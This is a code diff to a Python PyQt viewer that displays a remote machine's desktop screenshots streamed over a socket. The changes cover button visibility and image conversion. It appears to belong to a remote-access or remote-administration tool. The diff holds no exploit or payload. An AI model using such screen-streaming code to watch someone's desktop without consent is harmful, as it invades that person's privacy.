@@ -8,6 +8,7 @@ import zlib
 import os
 import string
 import random
+import ImageQt
 from datetime import datetime
 from ast import literal_eval
 
@@ -31,6 +32,8 @@ class mainPopup(QWidget, Ui_Form):
 
         self.setWindowTitle('Desktop Streaming from - %s - Socket #%s' % (self.ipAddress, self.socket))
 
+        self.stopStreamingButton.setVisible(False)
+
         self.startStreamingButton.clicked.connect(self.start_desktop)
         self.stopStreamingButton.clicked.connect(self.stop_desktop)
         self.alwaysTopButton.clicked.connect(self.always_top)
@@ -44,19 +47,24 @@ class mainPopup(QWidget, Ui_Form):
         self.timer.timeout.connect(self.set_screenshot)
         self.timer.start(0.1)
 
-    def set_screenshot(self):
-        try:
-            self.screenshotLabel.setPixmap(QPixmap.fromImage(self.desktop.screen_bits).scaled(
-                QSize(self.screenshotLabel.width(), self.screenshotLabel.height())))
-        except AttributeError:
-            pass
+        self.stopStreamingButton.setVisible(True)
+        self.startStreamingButton.setVisible(False)
 
     def stop_desktop(self):
+        self.stopStreamingButton.setVisible(False)
+        self.startStreamingButton.setVisible(True)
         try:
             self.desktop.active = False
         except AttributeError:
             pass
         self.timer.stop()
+
+    def set_screenshot(self):
+        try:
+            self.screenshotLabel.setPixmap(QPixmap.fromImage(ImageQt.ImageQt(self.desktop.screen_bits)).scaled(
+                self.screenshotLabel.size(), Qt.KeepAspectRatio))
+        except AttributeError:
+            pass
 
     def always_top(self):
         if self.alwaysTopButton.isChecked():
@@ -87,12 +95,7 @@ class DesktopStreaming(threading.Thread):
                 result = literal_eval(data)
                 im = Image.frombuffer('RGB', (int(result['width']), int(result['height'])),
                                       zlib.decompress(result['screenshotbits']), 'raw', 'BGRX', 0, 1)
-                data = im.convert('RGBA').tostring("raw", "RGBA")
-                self.screen_bits = QImage(data, im.size[0], im.size[1], QImage.Format_ARGB32_Premultiplied)
-                #try:
-                    #os.remove(self.path_to_preview)
-                #except:
-                    #pass
+                self.screen_bits = im.convert('RGBA')
             except ValueError:
                 pass
             except socket.error:
